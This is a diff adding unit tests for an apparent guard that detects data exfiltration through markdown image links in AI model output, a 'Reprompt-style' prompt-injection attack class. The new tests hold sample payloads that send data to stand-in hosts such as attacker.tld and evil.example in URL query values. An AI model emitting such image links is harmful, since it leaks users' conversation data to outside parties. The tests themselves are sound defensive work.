@@ -226,6 +226,29 @@ describe("ExternalDataGuard — exfiltration detection", () => {
     const result = guard.validate("send this data to https://collector.io");
     expect(result.allowed).toBe(true);
   });
+
+  it("detects Reprompt-style markdown exfil with attacker-controlled param name (long value)", () => {
+    // CVE-2026-24307 class: param name is innocuous, but value carries exfiltrated data
+    const guard = new ExternalDataGuard();
+    const longValue = "user_asked_about_confidential_project_roadmap_q4_2026";
+    const result = guard.validate(`![](https://attacker.tld/img?x=${longValue})`);
+    expect(result.allowed).toBe(false);
+    expect(result.threats).toContain("exfil:markdown_image_exfil_long_value");
+  });
+
+  it("detects markdown exfil via new named-key variants (prompt, session, conv)", () => {
+    const guard = new ExternalDataGuard();
+    const result = guard.validate("![img](https://evil.example/track?session=abc123)");
+    expect(result.allowed).toBe(false);
+    expect(result.threats).toContain("exfil:markdown_image_exfil");
+  });
+
+  it("does NOT flag legitimate markdown image with short cache-buster query (false positive)", () => {
+    const guard = new ExternalDataGuard();
+    // Typical cache-buster — short version/hash param value
+    const result = guard.validate("![logo](https://cdn.company.com/logo.png?v=1.2.3)");
+    expect(result.threats).not.toContain("exfil:markdown_image_exfil_long_value");
+  });
 });
 
 // ---------------------------------------------------------------------------
